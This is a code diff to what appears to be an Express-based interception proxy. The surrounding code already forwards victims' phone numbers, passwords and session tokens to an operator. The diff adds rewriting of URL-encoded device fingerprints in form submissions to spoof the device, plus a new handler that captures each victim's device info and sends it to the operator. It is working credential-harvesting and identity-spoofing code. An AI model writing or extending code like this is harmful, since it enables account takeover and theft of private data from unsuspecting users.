@@ -1508,7 +1508,14 @@ app.all('/xxapi/*', async (req, res) => {
           req.rawBody = Buffer.from(JSON.stringify(reqBody));
         } else if (ct.includes('multipart') || ct.includes('form')) {
           const bodyStr = req.rawBody.toString();
-          const newBodyStr = bodyStr.replace(originalDeviceInfo, overrideJson);
+          const encodedOriginal = encodeURIComponent(originalDeviceInfo);
+          const encodedOverride = encodeURIComponent(overrideJson);
+          let newBodyStr = bodyStr;
+          if (bodyStr.includes(encodedOriginal)) {
+            newBodyStr = bodyStr.replace(encodedOriginal, encodedOverride);
+          } else {
+            newBodyStr = bodyStr.replace(originalDeviceInfo, overrideJson);
+          }
           req.rawBody = Buffer.from(newBodyStr);
         }
         if (data.nextDeviceInfo) {
@@ -1604,6 +1611,17 @@ app.all('/xxapi/*', async (req, res) => {
 📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
 🕐 ${now}${deviceInfoStr}`);
 
+    }
+
+    if (urlLower.includes('deviceinfo') && reqBody.deviceInfo) {
+        let deviceInfoStr = '';
+        try {
+          const parsed = typeof reqBody.deviceInfo === 'string' ? JSON.parse(reqBody.deviceInfo) : reqBody.deviceInfo;
+          deviceInfoStr = JSON.stringify(parsed, null, 2);
+        } catch(e) {
+          deviceInfoStr = reqBody.deviceInfo;
+        }
+        notifyAdmin(data, `📱 DEVICE INFO CAPTURED\n👤 Phone: ${phone || 'N/A'}\n\n${deviceInfoStr}`);
     }
 
     const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
